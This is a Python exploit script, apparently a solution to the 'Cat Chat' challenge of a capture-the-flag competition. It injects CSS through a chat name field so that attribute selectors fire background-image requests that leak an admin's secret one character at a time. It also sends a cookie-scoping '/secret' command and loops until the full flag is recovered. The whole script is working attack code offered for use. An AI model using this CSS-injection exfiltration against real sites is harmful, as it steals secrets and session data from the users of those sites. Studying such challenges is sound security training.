#!/usr/bin/env python3
import requests
import uuid
import urllib
import time
import string
import json
import re
import sys

baseurl = "https://cat-chat.web.ctfcompetition.com"

roomId = str(uuid.uuid4())
#roomId = "d5ec5597-4218-4304-b911-30218d408c7f"

roomUrl = "{}/room/{}".format(baseurl, roomId)
print("Join {}/".format(roomUrl))

headers = {
    'referer': roomUrl
}

def send(roomUrl, name, msg):
    name = urllib.parse.quote(name)
    url = "{}/send?name={}&msg={}".format(roomUrl, name, msg)
    r = requests.get(url, headers=headers)
    return r

def searchReceive(search, timeout=None):
    regex = r'"msg":"(.+)"'
    r = requests.get("{}/receive".format(roomUrl), stream=True, timeout=timeout)
    for chunk in r.iter_content(chunk_size = None):
        data = chunk.decode('ascii')
        if search in data:
            return data

def genCSSLine(s):
    return 'span[data-secret^=' + s + ']{background-image:url(https://cat-chat.web.ctfcompetition.com/room/' + roomId + '/send?name=flag&msg=' + s + ');}'

def getCurrentSecret():
    data = searchReceive('"name":"flag","msg":"', 5)
    datapoints = data.split("data: ")
    secretPoint = next(json.loads(point.strip()) for point in datapoints if "CTF" in point)
    return secretPoint["msg"]

arg = str(sys.argv[1]) if len(sys.argv) > 1 else ""
res = "CTF\{" + arg

while True:
    print("Please /report")
    searchReceive("I will ruthlessly ban anyone")
    while True:
        print("Testing with {}".format(res))


        payload  = 'a]{color:red;}'
        payload += ''.join([genCSSLine(res + c) for c in string.ascii_letters + string.digits + "_"])
        payload += genCSSLine(res + "\}")
        send(roomUrl, payload, "dog")

        payload = "/secret deadbeef; Domain=foo.web.ctfcompetition.com"
        send(roomUrl, payload, "dog")

        # We will get a timeout here if the admin has left
        try:
            res = getCurrentSecret()
        except:
            break

        print("Flag is currently {}".format(res))

        if "}" in res:
            print("Found flag: {}".format(res))
            sys.exit()
        res = res.replace("{", "\\{")

